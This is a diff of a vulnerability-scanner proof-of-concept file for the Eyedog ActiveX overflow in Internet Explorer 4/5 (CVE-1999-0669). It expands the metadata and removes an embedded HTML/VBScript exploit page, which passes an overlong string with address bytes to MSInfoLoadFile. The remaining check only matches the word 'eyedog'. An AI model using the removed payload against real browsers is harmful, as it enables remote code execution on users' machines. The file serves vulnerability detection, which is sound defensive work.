@@ -1,45 +1,31 @@
 [info]
-author = "ave"
-description = "验证 Microsoft Internet Explorer 4.0/5.0 中 Eyedog ActiveX 控件缓冲区溢出漏洞。通过构造包含 object 标签（CLSID:06A7EC63-4E21-11D0-A112-00A0C90543AA）的恶意 HTML 页面，调用 MSInfoLoadFile 方法传入超长字符串触发溢出，导致浏览器崩溃或执行任意代码。"
+author = "AVE"
+description = "Microsoft Internet Explorer 4.0/5.0 中 Eyedog ActiveX 控件被错误标记为对脚本安全导致的远程代码执行漏洞。通过构造包含 clsid:06A7EC63-4E21-11D0-A112-00A0C90543AA 对象的恶意 HTML 页面，调用 MSInfoLoadFile 方法触发缓冲区溢出，可执行任意命令（Bubbleboy 蠕虫曾利用此漏洞）。"
 id = "POC-AVE-1999-0196"
-name = "Microsoft Internet Explorer 4/5 Eyedog ActiveX Remote Overflow PoC"
+name = "CVE-1999-0669 PoC"
 severity = "medium"
-tags = ["ave-1999-0196"]
+tags = [
+    "cve-1999-0669",
+    "activex",
+    "ie",
+    "rce",
+    "bubbleboy",
+]
 vuln_id = [
     "CVE-1999-0669",
     "AVE-1999-0196",
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "GET"
 path = "/{{BaseURL}}/eyedog-poc.html"
 protocol = "http"
 
-[poc.requests.body]
-content = """
-<html>
-<body>
-<object classid="clsid:06A7EC63-4E21-11D0-A112-00A0C90543AA" id="eye"></object>
-<script language="vbscript">
-expstr = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-expstr = expstr + Chr(202) + Chr(212) + Chr(248) + Chr(191)
-eye.MSInfoLoadFile(expstr)
-</script>
-</body>
-</html>
-"""
-type = "raw"
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
-
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["eyedog-poc.html"]
+words = ["eyedog"]
